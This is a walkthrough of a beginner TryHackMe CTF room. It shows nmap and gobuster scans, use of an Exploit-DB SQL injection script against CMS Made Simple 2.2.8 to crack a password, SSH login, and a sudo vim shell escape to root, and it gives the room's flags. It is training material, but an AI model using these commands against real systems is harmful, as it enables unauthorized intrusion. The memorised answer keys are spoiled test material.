<div align="center">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png" height="400"></img>
</div>

# Link & Description
https://tryhackme.com/room/easyctf

*Beginner level ctf*

# Walkthrough :

## **First question** : *How many services are running under port 1000?*
So let's begging with a basic Nmap scan :
`Nmap -sC -sV VICTIM_IP`

[![Capture-d-cran-2025-09-24-135308.png](https://i.postimg.cc/FHb6t1Mh/Capture-d-cran-2025-09-24-135308.png)](https://postimg.cc/Yv9RY22P)

As we can see, we have 2 services under the port 1000 so we can answer the first question

*How many services are running under port 1000?* : **2**
## **Second question** : *What is running on the higher port?*
Very simple, we take a look on the port number 2222

*What is running on the higher port?* : **SSH**
## **Third question** : *What's the CVE you're using against the application?*
So we need to take a futher look on the http page that we scanned and do a gobuster on it with :
`gobuster dir -u VICTIM_IP -w /usr/share/wordlists/dirb/common.txt`


[![Capture-d-cran-2025-09-24-140414.png](https://i.postimg.cc/vTgQX5SY/Capture-d-cran-2025-09-24-140414.png)](https://postimg.cc/GTRwmTCV)

So let's go on the */simple*. We discovered a "CMS made simple" with the version "2.2.8" with a title "Home - Pentest it", I suppose that the right way.

After a search on Exploit-DB, I found an payload that can be useful: https://www.exploit-db.com/exploits/46635 so let's dl it and use it

*What's the CVE you're using against the application?* **CVE-2019-9053**
## **Forth question** : *To what kind of vulnerability is the application vulnerable?*
It's said in the exploit DB page

*To what kind of vulnerability is the application vulnerable?* : **SQLI**
## **Fifth question** : *What's the password ?* 
For that, let's start our POC with this command : `python2.7 46635.py -u http://VICTIM_IP/simple/ -w /usr/share/wordlists/rockyou.txt -c`

the *-u* the URL, the *-w* for the wordlist and the *-c* for the crack option

And after waiting we have the credentials 

[![Capture-d-cran-2025-09-24-144114.png](https://i.postimg.cc/Wzvn7cnX/Capture-d-cran-2025-09-24-144114.png)](https://postimg.cc/R6gKM82H)

*What's the password ?* : **secret**
## **Sixth question** : *Where can you login with the details obtained?*
It's only a guess but I supposed SSH and it is

*Where can you login with the details obtained?* : **SSH**
## **Seventh question** : *What's the user flag?* 
For that, Let's try to log on the SSH service with the credentials obtained

`ssh mitch@VICTIM_IP -p 2222`

And voila !

[![Capture-d-cran-2025-09-24-144339.png](https://i.postimg.cc/d1Mmqczw/Capture-d-cran-2025-09-24-144339.png)](https://postimg.cc/LqTZTw9b)

*What's the user flag?* : **G00d j0b, keep up!**
## **Eighth question** : *Is there any other user in the home directory? What's its name?*
Easy, we do a  `ls /home`

*Is there any other user in the home directory? What's its name?* : **sunbath**
## **Ninth question** :  *What can you leverage to spawn a privileged shell?*
Surely I should upload **linpeas.sh** to truly see all possibilites for privilegde escalation but I will first see a simple `sudo -l`

And we have our anwser

[![Capture-d-cran-2025-09-24-145026.png](https://i.postimg.cc/gk5w9H9P/Capture-d-cran-2025-09-24-145026.png)](https://postimg.cc/bsxYkbN6)

So now let's take a look and GTFOBins, a website for indicate how to perform some privilegde escalation and we search VIM

https://gtfobins.github.io/gtfobins/vim/

Now we follow the Sudo's instruction : `sudo vim -c ':!/bin/sh'` and enjoy our root's priviledge 

[![Capture-d-cran-2025-09-24-145327.png](https://i.postimg.cc/fT3LvSVq/Capture-d-cran-2025-09-24-145327.png)](https://postimg.cc/fJNDzLjY)

*What can you leverage to spawn a privileged shell?* **VIM**
## **Tenth question** : What's the root flag?
We simplely do a `cat /root/root.txt`

*What's the root flag?* **W3ll d0n3. You made it!**
